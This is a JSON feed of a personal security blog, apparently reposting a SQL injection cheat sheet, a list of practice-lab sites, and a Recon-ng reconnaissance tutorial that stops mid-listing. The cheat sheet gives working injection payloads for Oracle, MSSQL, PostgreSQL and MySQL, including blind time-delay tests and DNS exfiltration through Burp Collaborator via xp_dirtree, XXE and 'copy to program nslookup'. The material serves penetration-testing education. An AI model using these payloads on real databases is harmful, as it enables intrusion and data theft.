{
    "version": "https://jsonfeed.org/version/1",
    "title": "Sakibul Ali Khan",
    "description": "",
    "home_page_url": "https://sakibulalikhan.github.io/blog",
    "feed_url": "https://sakibulalikhan.github.io/blog/feed.json",
    "user_comment": "",
    "author": {
        "name": "Sakibul Ali Khan"
    },
    "items": [
        {
            "id": "https://sakibulalikhan.github.io/blog/best-sites-with-free-challenges-to-practice-your-cyber-skills.html",
            "url": "https://sakibulalikhan.github.io/blog/best-sites-with-free-challenges-to-practice-your-cyber-skills.html",
            "title": "Best sites with free challenges to practice your cyber skills",
            "summary": "Challenges Here there are some sites with free challenges to practice different skills. It could be useful for someone. CTFs CTFtime.org AWS Security&hellip;",
            "content_html": "<div class=\"content-wrapper\">\n<h1>Challenges</h1>\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse4.mm.bing.net%2Fth%3Fid%3DOIP.nfbkHDUqo2ZEfzTmk3AX1AHaB7%26pid%3DApi&amp;f=1\" data-is-external-image=\"true\"  alt=\"Cyber Challenge list\" width=\"2735\" height=\"709\"></figure>\n<p><em>Here there are some sites with free challenges to practice different skills. It could be useful for someone.</em></p>\n<div id=\"outline-container-headline-1\" class=\"outline-3\">\n<h3 id=\"headline-1\">CTFs</h3>\n<div id=\"outline-text-headline-1\" class=\"outline-text-3\">\n<ul>\n<li><a href=\"https://ctftime.org/\">CTFtime.org</a></li>\n</ul>\n</div>\n</div>\n<div id=\"outline-container-headline-2\" class=\"outline-3\">\n<h3 id=\"headline-2\">AWS Security</h3>\n<div id=\"outline-text-headline-2\" class=\"outline-text-3\">\n<ul>\n<li><a href=\"http://flaws.cloud/\">http://flaws.cloud/</a></li>\n<li><a href=\"http://flaws2.cloud/\">http://flaws2.cloud/</a></li>\n<li><a href=\"https://github.com/RhinoSecurityLabs/cloudgoat\">https://github.com/RhinoSecurityLabs/cloudgoat</a></li>\n<li><a href=\"https://github.com/nccgroup/sadcloud\">https://github.com/nccgroup/sadcloud</a></li>\n<li><a href=\"https://github.com/BishopFox/iam-vulnerable\">https://github.com/BishopFox/iam-vulnerable</a></li>\n</ul>\n</div>\n</div>\n<div id=\"outline-container-headline-3\" class=\"outline-3\">\n<h3 id=\"headline-3\">Crypto</h3>\n<div id=\"outline-text-headline-3\" class=\"outline-text-3\">\n<ul>\n<li><a href=\"https://cryptopals.com/\">https://cryptopals.com/</a></li>\n<li><a href=\"https://cryptohack.org/\">https://cryptohack.org/</a></li>\n</ul>\n</div>\n</div>\n<div id=\"outline-container-headline-4\" class=\"outline-3\">\n<h3 id=\"headline-4\">Docker</h3>\n<div id=\"outline-text-headline-4\" class=\"outline-text-3\">\n<ul>\n<li><a href=\"https://notsosecure.com/vulnerable-docker-vm/\">https://notsosecure.com/vulnerable-docker-vm/</a></li>\n</ul>\n</div>\n</div>\n<div id=\"outline-container-headline-5\" class=\"outline-3\">\n<h3 id=\"headline-5\">Exploiting</h3>\n<div id=\"outline-text-headline-5\" class=\"outline-text-3\">\n<ul>\n<li><a href=\"http://pwnable.kr/\">http://pwnable.kr/</a></li>\n<li><a href=\"http://exploit.education/\">http://exploit.education/</a></li>\n<li><a href=\"https://ropemporium.com/\">https://ropemporium.com/</a></li>\n<li><a href=\"https://github.com/shellphish/how2heap\">https://github.com/shellphish/how2heap</a></li>\n<li><a href=\"https://pwn.college/\">https://pwn.college/</a></li>\n</ul>\n</div>\n</div>\n<div id=\"outline-container-headline-6\" class=\"outline-3\">\n<h3 id=\"headline-6\">GCP Security</h3>\n<div id=\"outline-text-headline-6\" class=\"outline-text-3\">\n<ul>\n<li><a href=\"https://thunder-ctf.cloud/\">https://thunder-ctf.cloud/</a></li>\n</ul>\n</div>\n</div>\n<div id=\"outline-container-headline-7\" class=\"outline-3\">\n<h3 id=\"headline-7\">Misc</h3>\n<div id=\"outline-text-headline-7\" class=\"outline-text-3\">\n<ul>\n<li><a href=\"https://overthewire.org/\">https://overthewire.org/</a></li>\n<li><a href=\"https://www.root-me.org/\">https://www.root-me.org/</a></li>\n<li><a href=\"https://ctflearn.com/\">https://ctflearn.com/</a></li>\n<li><a href=\"https://ringzer0ctf.com/\">https://ringzer0ctf.com/</a></li>\n<li><a href=\"https://tryhackme.com/\">https://tryhackme.com/</a></li>\n<li><a href=\"https://w3challs.com/\">https://w3challs.com/</a></li>\n<li><a href=\"http://gracker.org/\">http://gracker.org/</a></li>\n</ul>\n</div>\n</div>\n<div id=\"outline-container-headline-8\" class=\"outline-3\">\n<h3 id=\"headline-8\">Powershell</h3>\n<div id=\"outline-text-headline-8\" class=\"outline-text-3\">\n<ul>\n<li><a href=\"https://www.underthewire.tech/\">https://www.underthewire.tech</a></li>\n</ul>\n</div>\n</div>\n<div id=\"outline-container-headline-9\" class=\"outline-3\">\n<h3 id=\"headline-9\">Programming</h3>\n<div id=\"outline-text-headline-9\" class=\"outline-text-3\">\n<ul>\n<li><a href=\"https://github.com/donnemartin/interactive-coding-challenges\">https://github.com/donnemartin/interactive-coding-challenges</a></li>\n</ul>\n</div>\n</div>\n<div id=\"outline-container-headline-10\" class=\"outline-3\">\n<h3 id=\"headline-10\">Pentest</h3>\n<div id=\"outline-text-headline-10\" class=\"outline-text-3\">\n<ul>\n<li><a href=\"https://www.hackthebox.eu/\">https://www.hackthebox.eu/</a></li>\n<li><a href=\"https://www.vulnhub.com/\">https://www.vulnhub.com/</a></li>\n<li><a href=\"https://www.cyberseclabs.co.uk/\">https://www.cyberseclabs.co.uk/</a></li>\n</ul>\n</div>\n</div>\n<div id=\"outline-container-headline-11\" class=\"outline-3\">\n<h3 id=\"headline-11\">Reversing</h3>\n<div id=\"outline-text-headline-11\" class=\"outline-text-3\">\n<ul>\n<li><a href=\"https://challenges.re/\">https://challenges.re/</a></li>\n<li><a href=\"https://github.com/ytisf/theZoo\">https://github.com/ytisf/theZoo</a></li>\n<li><a href=\"http://reversing.kr/\">http://reversing.kr/</a></li>\n</ul>\n</div>\n</div>\n<div id=\"outline-container-headline-12\" class=\"outline-3\">\n<h3 id=\"headline-12\">SysAdmin</h3>\n<div id=\"outline-text-headline-12\" class=\"outline-text-3\">\n<ul>\n<li><a href=\"https://github.com/trimstray/test-your-sysadmin-skills\">https://github.com/trimstray/test-your-sysadmin-skills</a></li>\n</ul>\n</div>\n</div>\n<div id=\"outline-container-headline-13\" class=\"outline-3\">\n<h3 id=\"headline-13\">Web</h3>\n<div id=\"outline-text-headline-13\" class=\"outline-text-3\">\n<ul>\n<li><a href=\"https://portswigger.net/web-security\">https://portswigger.net/web-security</a></li>\n<li><a href=\"https://ctfchallenge.co.uk/\">https://ctfchallenge.co.uk</a></li>\n<li><a href=\"https://pentesterlab.com/exercises\">https://pentesterlab.com/exercises</a></li>\n<li><a href=\"https://ctf.hacker101.com/\">https://ctf.hacker101.com/</a></li>\n<li><a href=\"https://xss-game.appspot.com/\">https://xss-game.appspot.com/</a></li>\n<li><a href=\"http://www.dvwa.co.uk/\">http://www.dvwa.co.uk/</a></li>\n<li><a href=\"https://google-gruyere.appspot.com/\">https://google-gruyere.appspot.com/</a></li>\n<li><a href=\"https://xss.pwnfunction.com/\">https://xss.pwnfunction.com/</a></li>\n<li><a href=\"https://github.com/tegal1337/0l4bs\">https://github.com/tegal1337/0l4bs</a></li>\n<li><a href=\"https://application.security/free-application-security-training\">https://application.security/free-application-security-training</a></li>\n</ul>\n</div>\n</div>\n<div id=\"outline-container-headline-14\" class=\"outline-3\">\n<h3 id=\"headline-14\">More</h3>\n<div id=\"outline-text-headline-14\" class=\"outline-text-3\">\n<ul>\n<li><a href=\"https://github.com/mikeprivette/awesome-sec-challenges\">https://github.com/mikeprivette/awesome-sec-challenges</a></li>\n<li><a href=\"https://github.com/apsdehal/awesome-ctf#wargames\">https://github.com/apsdehal/awesome-ctf#wargames</a></li>\n</ul>\n</div>\n</div>\n<ul id=\"main-list\"></ul>\n</div>",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
            ],
            "date_published": "2022-07-15T20:41:50+06:00",
            "date_modified": "2022-07-15T20:41:50+06:00"
        },
        {
            "id": "https://sakibulalikhan.github.io/blog/sql-injection-cheat-sheet.html",
            "url": "https://sakibulalikhan.github.io/blog/sql-injection-cheat-sheet.html",
            "title": "SQL injection cheat sheet",
            "summary": "This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing&hellip;",
            "content_html": "<figure class=\"post__image post__image--center\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.github.io/blog/media/posts/11/second-order-sql-injection.svg\" alt=\"What is SQL injection\" width=\"781\" height=\"440\"></figure>\n<p>This <a href=\"https://portswigger.net/web-security/sql-injection\">SQL injection</a> cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.</p>\n<h2 id=\"string-concatenation\">String concatenation</h2>\n<p>You can concatenate together multiple strings to make a single string.</p>\n<table class=\"is-nonresponsive-table\">\n<tbody>\n<tr>\n<th>Oracle</th>\n<td><code>'foo'||'bar'</code></td>\n</tr>\n<tr>\n<th>Microsoft</th>\n<td><code>'foo'+'bar'</code></td>\n</tr>\n<tr>\n<th>PostgreSQL</th>\n<td><code>'foo'||'bar'</code></td>\n</tr>\n<tr>\n<th>MySQL</th>\n<td><code>'foo' 'bar'</code> [Note the space between the two strings]<br><code>CONCAT('foo','bar')</code></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"substring\">Substring</h2>\n<p>You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string <code>ba</code>.</p>\n<table class=\"is-nonresponsive-table\">\n<tbody>\n<tr>\n<th>Oracle</th>\n<td><code>SUBSTR('foobar', 4, 2)</code></td>\n</tr>\n<tr>\n<th>Microsoft</th>\n<td><code>SUBSTRING('foobar', 4, 2)</code></td>\n</tr>\n<tr>\n<th>PostgreSQL</th>\n<td><code>SUBSTRING('foobar', 4, 2)</code></td>\n</tr>\n<tr>\n<th>MySQL</th>\n<td><code>SUBSTRING('foobar', 4, 2)</code></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"comments\">Comments</h2>\n<p>You can use comments to truncate a query and remove the portion of the original query that follows your input.</p>\n<table class=\"is-nonresponsive-table\">\n<tbody>\n<tr>\n<th>Oracle</th>\n<td><code>--comment<br></code></td>\n</tr>\n<tr>\n<th>Microsoft</th>\n<td><code>--comment<br>/*comment*/</code></td>\n</tr>\n<tr>\n<th>PostgreSQL</th>\n<td><code>--comment<br>/*comment*/</code></td>\n</tr>\n<tr>\n<th>MySQL</th>\n<td><code>#comment</code><br><code>-- comment</code> [Note the space after the double dash]<br><code>/*comment*/</code></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"database-version\">Database version</h2>\n<p>You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.</p>\n<table class=\"is-nonresponsive-table\">\n<tbody>\n<tr>\n<th>Oracle</th>\n<td><code>SELECT banner FROM v$version<br>SELECT version FROM v$instance<br></code></td>\n</tr>\n<tr>\n<th>Microsoft</th>\n<td><code>SELECT @@version</code></td>\n</tr>\n<tr>\n<th>PostgreSQL</th>\n<td><code>SELECT version()</code></td>\n</tr>\n<tr>\n<th>MySQL</th>\n<td><code>SELECT @@version</code></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"database-contents\">Database contents</h2>\n<p>You can list the tables that exist in the database, and the columns that those tables contain.</p>\n<table class=\"is-nonresponsive-table\">\n<tbody>\n<tr>\n<th>Oracle</th>\n<td><code>SELECT * FROM all_tables<br>SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'</code></td>\n</tr>\n<tr>\n<th>Microsoft</th>\n<td><code>SELECT * FROM information_schema.tables<br>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'<br></code></td>\n</tr>\n<tr>\n<th>PostgreSQL</th>\n<td><code>SELECT * FROM information_schema.tables<br>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'<br></code></td>\n</tr>\n<tr>\n<th>MySQL</th>\n<td><code>SELECT * FROM information_schema.tables<br>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'<br></code></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"conditional-errors\">Conditional errors</h2>\n<p>You can test a single boolean condition and trigger a database error if the condition is true.</p>\n<table class=\"is-nonresponsive-table\">\n<tbody>\n<tr>\n<th>Oracle</th>\n<td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual</code></td>\n</tr>\n<tr>\n<th>Microsoft</th>\n<td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</code></td>\n</tr>\n<tr>\n<th>PostgreSQL</th>\n<td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END</code></td>\n</tr>\n<tr>\n<th>MySQL</th>\n<td><code>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')</code></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"batched-or-stacked-queries\">Batched (or stacked) queries</h2>\n<p>You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.</p>\n<table class=\"is-nonresponsive-table\">\n<tbody>\n<tr>\n<th>Oracle</th>\n<td><code>Does not support batched queries.</code></td>\n</tr>\n<tr>\n<th>Microsoft</th>\n<td><code>QUERY-1-HERE; QUERY-2-HERE</code></td>\n</tr>\n<tr>\n<th>PostgreSQL</th>\n<td><code>QUERY-1-HERE; QUERY-2-HERE</code></td>\n</tr>\n<tr>\n<th>MySQL</th>\n<td><code>QUERY-1-HERE; QUERY-2-HERE</code></td>\n</tr>\n</tbody>\n</table>\n<div class=\"component-notes\">\n<h4>Note</h4>\n<p>With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.</p>\n</div>\n<h2 id=\"time-delays\">Time delays</h2>\n<p>You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.</p>\n<table class=\"is-nonresponsive-table\">\n<tbody>\n<tr>\n<th>Oracle</th>\n<td><code>dbms_pipe.receive_message(('a'),10)</code></td>\n</tr>\n<tr>\n<th>Microsoft</th>\n<td><code>WAITFOR DELAY '0:0:10'</code></td>\n</tr>\n<tr>\n<th>PostgreSQL</th>\n<td><code>SELECT pg_sleep(10)</code></td>\n</tr>\n<tr>\n<th>MySQL</th>\n<td><code>SELECT sleep(10)</code></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"conditional-time-delays\">Conditional time delays</h2>\n<p>You can test a single boolean condition and trigger a time delay if the condition is true.</p>\n<table class=\"is-nonresponsive-table\">\n<tbody>\n<tr>\n<th>Oracle</th>\n<td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual</code></td>\n</tr>\n<tr>\n<th>Microsoft</th>\n<td><code>IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'</code></td>\n</tr>\n<tr>\n<th>PostgreSQL</th>\n<td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</code></td>\n</tr>\n<tr>\n<th>MySQL</th>\n<td><code>SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')</code></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"dns-lookup\">DNS lookup</h2>\n<p>You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use <a href=\"https://portswigger.net/burp/documentation/desktop/tools/collaborator-client\">Burp Collaborator client</a> to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.</p>\n<table class=\"is-nonresponsive-table\">\n<tbody>\n<tr>\n<th>Oracle</th>\n<td>The following technique leverages an XML external entity (<a href=\"https://portswigger.net/web-security/xxe\">XXE</a>) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:<br><code>SELECT extractvalue(xmltype('&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM \"http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/\"&gt; %remote;]&gt;'),'/l') FROM dual</code><br><br>The following technique works on fully patched Oracle installations, but requires elevated privileges:<br><code>SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net')</code></td>\n</tr>\n<tr>\n<th>Microsoft</th>\n<td><code>exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'</code></td>\n</tr>\n<tr>\n<th>PostgreSQL</th>\n<td><code>copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net'</code></td>\n</tr>\n<tr>\n<th>MySQL</th>\n<td>The following techniques work on Windows only:<br><code>LOAD_FILE('\\\\\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\\\a')</code><br><code>SELECT ... INTO OUTFILE '\\\\\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a'</code></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"dns-lookup-with-data-exfiltration\">DNS lookup with data exfiltration</h2>\n<p>You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use <a href=\"https://portswigger.net/burp/documentation/desktop/tools/collaborator-client\">Burp Collaborator client</a> to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.</p>\n<table class=\"is-nonresponsive-table\">\n<tbody>\n<tr>\n<th>Oracle</th>\n<td><code>SELECT extractvalue(xmltype('&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM \"http://'||(SELECT YOUR-QUERY-HERE)||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/\"&gt; %remote;]&gt;'),'/l') FROM dual</code></td>\n</tr>\n<tr>\n<th>Microsoft</th>\n<td><code>declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree \"//'+@p+'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a\"')</code></td>\n</tr>\n<tr>\n<th>PostgreSQL</th>\n<td><code>create OR replace function f() returns void as $$<br>declare c text;<br>declare p text;<br>begin<br>SELECT into p (SELECT YOUR-QUERY-HERE);<br>c := 'copy (SELECT '''') to program ''nslookup '||p||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net''';<br>execute c;<br>END;<br>$$ language plpgsql security definer;<br>SELECT f();</code></td>\n</tr>\n<tr>\n<th>MySQL</th>\n<td>The following technique works on Windows only:<br><code>SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a'</code></td>\n</tr>\n</tbody>\n</table>\n<p>Source:- <span data-slate-fragment=\"JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMiUyRiUyRnBvcnRzd2lnZ2VyLm5ldCUyRndlYi1zZWN1cml0eSUyRnNxbC1pbmplY3Rpb24lMkZjaGVhdC1zaGVldCUyMiUyQyUyMm1hcmtzJTIyJTNBJTVCJTVEJTJDJTIyc2VsZWN0aW9ucyUyMiUzQSU1QiU1RCU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMjhmOWZlYmZlM2I2ZjQyNTNiM2RlYmE3ZWNiMDY1ZGQxJTIyJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIyNmU1ZjM2Y2MzOTU0NDVhNTgwNDVjOGFiMmM4YWFmMjYlMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjI0ZTJkZTA5ZTg3MzI0NjM5OWY0MTNmNTMzZTUyNWU2ZiUyMiU3RA==\">//portswigger.net/web-security/sql-injection/cheat-sheet</span></p>",
            "image": "https://sakibulalikhan.github.io/blog/media/posts/11/sql-injection.svg",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "Sqli",
                   "SQL Injection",
                   "Pentesting",
                   "Cyber security"
            ],
            "date_published": "2022-01-22T12:24:04+06:00",
            "date_modified": "2022-01-22T12:24:04+06:00"
        },
        {
            "id": "https://sakibulalikhan.github.io/blog/how-to-use-recon-ng.html",
            "url": "https://sakibulalikhan.github.io/blog/how-to-use-recon-ng.html",
            "title": "How To Use  Recon-ng",
            "summary": "Recon-ng is a framework that helps automate the OSINT work. It uses modules from various authors and provides a multitude of functionality. Some modules&hellip;",
            "content_html": "<div class=\"card-header task-header\" data-toggle=\"collapse\" aria-expanded=\"true\"><figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.github.io/blog/media/posts/9/recon-ng-2.png\" sizes=\"(max-width: 48em) 100vw, 768px\" srcset=\"https://sakibulalikhan.github.io/blog/media/posts/9/responsive/recon-ng-2-xs.png 300w ,https://sakibulalikhan.github.io/blog/media/posts/9/responsive/recon-ng-2-sm.png 480w ,https://sakibulalikhan.github.io/blog/media/posts/9/responsive/recon-ng-2-md.png 768w ,https://sakibulalikhan.github.io/blog/media/posts/9/responsive/recon-ng-2-lg.png 1024w ,https://sakibulalikhan.github.io/blog/media/posts/9/responsive/recon-ng-2-xl.png 1360w ,https://sakibulalikhan.github.io/blog/media/posts/9/responsive/recon-ng-2-2xl.png 1600w\"  alt=\"recon-ng\" width=\"913\" height=\"522\"></figure></div>\n<div id=\"collapse6\" class=\"collapse show\" data-parent=\"#taskContent\">\n<div class=\"card-body task-incomplete\">\n<div class=\"room-task-desc\">\n<div class=\"room-task-desc-data\">\n<p><a href=\"https://github.com/lanmaster53/recon-ng\">Recon-ng</a> is a framework that helps automate the OSINT work. It uses modules from various authors and provides a multitude of functionality. Some modules require keys to work; the key allows the module to query the related online API. In this task, we will demonstrate using Recon-ng in the terminal.</p>\n<p>From a penetration testing and red team point of view, Recon-ng can be used to find various bits and pieces of information that can aid in an operation or OSINT task. All the data collected is automatically saved in the database related to your workspace. For instance, you might discover host addresses to later port-scan or collect contact email addresses for <a class=\"112cNeVn glossary-term\" onclick=\"initPopOver('Phishing', '112cNeVn')\">phishing</a> attacks.</p>\n<p>You can start Recon-ng by running the command <code>recon-ng</code>. Starting Recon-ng will give you a prompt like <code>[recon-ng][default] &gt;</code>. At this stage, you need to select the installed module you want to use. However, if this is the first time you're running <code>recon-ng</code>, you will need to install the module(s) you need.</p>\n<p>In this task, we will follow the following workflow:</p>\n<ol>\n<li>Create a workspace for your project</li>\n<li>Insert the starting information into the database</li>\n<li>Search the marketplace for a module and learn about it before installing</li>\n<li>List the installed modules and load one</li>\n<li>Run the loaded module</li>\n</ol>\n<h3>Creating a Workspace</h3>\n<p>Run <code>workspaces create WORKSPACE_NAME</code> to create a new workspace for your investigation. For example, <code>workspaces create example</code> will create a workspace named <code>example</code>.</p>\n<p><code>recon-ng -w WORKSPACE_NAME</code> starts recon-ng with the specific workspace.</p>\n<h3>Seeding the Database</h3>\n<p>In reconnaissance, you are starting with one piece of information and transforming it into new pieces of information. For instance, you might start your research with a company name and use that to discover the domain name(s), contacts and profiles. Then you would use the new information you obtained to transform it further and learn more about your target.</p>\n<p>Let’s consider the case where we know the target's domain name, <code>example.com</code>, and we would like to feed it into the Recon-ng database related to the active workspace. If we want to check the names of the tables in our database, we can run <code>db schema</code>.</p>\n<p>We want to insert the domain name <code>example.com</code> into the domains table. We can do this using the command <code>db insert domains</code>.</p>\n<div class=\"terminal-container\">\n<div class=\"terminal-content\">\n<div class=\"terminal-top\">Pentester Terminal</div>\n<pre class=\"terminal-code language-shell-session\" tabindex=\"0\"><code class=\" language-shell-session\"><span class=\"token command\"><span class=\"token info punctuation\"><span class=\"token user\">sak@parrot</span></span><span class=\"token shell-symbol important\">$</span> <span class=\"token bash language-bash\">recon-ng -w example.com</span></span>\n<span class=\"token output\">[...]\n[recon-ng][example] &gt; db insert domains\ndomain (TEXT): example.com\nnotes (TEXT): \n[*] 1 rows affected.\n[recon-ng][example] &gt; marketplace search</span></code></pre>\n</div>\n</div>\n<h3>Recon-ng Marketplace</h3>\n<p>We have a domain name, so a logical next step would be to search for a module that transforms domains into other types of information. Assuming we are starting from a fresh installation of Recon-ng, we will search for suitable modules from the marketplace.</p>\n<p>Before you install modules using the marketplace, these are some useful commands related to marketplace usage:</p>\n<ul>\n<li><code>marketplace search KEYWORD</code> to search for available modules with <em>keyword</em>.</li>\n<li><code>marketplace info MODULE</code> to provide information about the module in question.</li>\n<li><code>marketplace install MODULE</code> to install the specified module into Recon-ng.</li>\n<li><code>marketplace remove MODULE</code> to uninstall the specified module.</li>\n</ul>\n<p>The modules are grouped under multiple categories, such as discovery, import, recon and reporting. Moreover, recon is also divided into many subcategories depending on the transform type. Run <code>marketplace search</code> to get a list of all available modules.</p>\n<p>In the terminal below, we search for modules containing <code>domains-</code>.</p>\n<div class=\"terminal-container\">\n<div class=\"terminal-content\">\n<div class=\"terminal-top\">Pentester Terminal</div>\n<pre class=\"terminal-code language-shell-session\" tabindex=\"0\"><code class=\" language-shell-session\"><span class=\"token command\"><span class=\"token info punctuation\"><span class=\"token user\">sak@parrot</span></span><span class=\"token shell-symbol important\">$</span> <span class=\"token bash language-bash\">recon-ng -w example</span></span>\n<span class=\"token output\">[...]\n[recon-ng][example] &gt; marketplace search domains-\n[*] Searching module index for 'domains-'...\n\n  +---------------------------------------------------------------------------------------------------+\n  |                        Path                        | Version |     Status    |  Updated   | D | K |\n  +---------------------------------------------------------------------------------------------------+\n  | recon/domains-companies/censys_companies           | 2.0     | not installed | 2021-05-10 | * | * |\n  | recon/domains-companies/pen                        | 1.1     | not installed | 2019-10-15 |   |   |\n  | recon/domains-companies/whoxy_whois                | 1.1     | not installed | 2020-06-24 |   | * |\n  | recon/domains-contacts/hunter_io                   | 1.3     | not installed | 2020-04-14 |   | * |\n  | recon/domains-contacts/metacrawler                 | 1.1     | not installed | 2019-06-24 | * |   |\n  | recon/domains-contacts/pen                         | 1.1     | not installed | 2019-10-15 |   |   |\n  | recon/domains-contacts/pgp_search                  | 1.4     | not installed | 2019-10-16 |   |   |\n  | recon/domains-contacts/whois_pocs                  | 1.0     | not installed | 2019-06-24 |   |   |\n  | recon/domains-contacts/wikileaker                  | 1.0     | not installed | 2020-04-08 |   |   |\n  | recon/domains-credentials/pwnedlist/account_creds  | 1.0     | not installed | 2019-06-24 | * | * |\n  | recon/domains-credentials/pwnedlist/api_usage      | 1.0     | not installed | 2019-06-24 |   | * |\n  | recon/domains-credentials/pwnedlist/domain_creds   | 1.0     | not installed | 2019-06-24 | * | * |\n  | recon/domains-credentials/pwnedlist/domain_ispwned | 1.0     | not installed | 2019-06-24 |   | * |\n  | recon/domains-credentials/pwnedlist/leak_lookup    | 1.0     | not installed | 2019-06-24 |   |   |\n  | recon/domains-credentials/pwnedlist/leaks_dump     | 1.0     | not installed | 2019-06-24 |   | * |\n  | recon/domains-domains/brute_suffix                 | 1.1     | not installed | 2020-05-17 |   |   |\n  | recon/domains-hosts/binaryedge                     | 1.2     | not installed | 2020-06-18 |   | * |\n  | recon/domains-hosts/bing_domain_api                | 1.0     | not installed | 2019-06-24 |   | * |\n  | recon/domains-hosts/bing_domain_web                | 1.1     | not installed | 2019-07-04 |   |   |\n  | recon/domains-hosts/brute_hosts                    | 1.0     | not installed | 2019-06-24 |   |   |\n  | recon/domains-hosts/builtwith                      | 1.1     | not installed | 2021-08-24 |   | * |\n  | recon/domains-hosts/censys_domain                  | 2.0     | not installed | 2021-05-10 | * | * |\n  | recon/domains-hosts/certificate_transparency       | 1.2     | not installed | 2019-09-16 |   |   |\n  | recon/domains-hosts/google_site_web                | 1.0     | not installed | 2019-06-24 |   |   |\n  | recon/domains-hosts/hackertarget                   | 1.1     | not installed | 2020-05-17 |   |   |\n  | recon/domains-hosts/mx_spf_ip                      | 1.0     | not installed | 2019-06-24 |   |   |\n  | recon/domains-hosts/netcraft                       | 1.1     | not installed | 2020-02-05 |   |   |\n  | recon/domains-hosts/shodan_hostname                | 1.1     | not installed | 2020-07-01 | * | * |\n  | recon/domains-hosts/spyse_subdomains               | 1.1     | not installed | 2021-08-24 |   | * |\n  | recon/domains-hosts/ssl_san                        | 1.0     | not installed | 2019-06-24 |   |   |\n  | recon/domains-hosts/threatcrowd                    | 1.0     | not installed | 2019-06-24 |   |   |\n  | recon/domains-hosts/threatminer                    | 1.0     | not installed | 2019-06-24 |   |   |\n  | recon/domains-vulnerabilities/ghdb                 | 1.1     | not installed | 2019-06-26 |   |   |\n  | recon/domains-vulnerabilities/xssed                | 1.1     | not installed | 2020-10-18 |   |   |\n  +---------------------------------------------------------------------------------------------------+\n\n  D = Has dependencies. See info for details.\n  K = Requires keys. See info for details.\n\n[recon-ng][thmredteam] 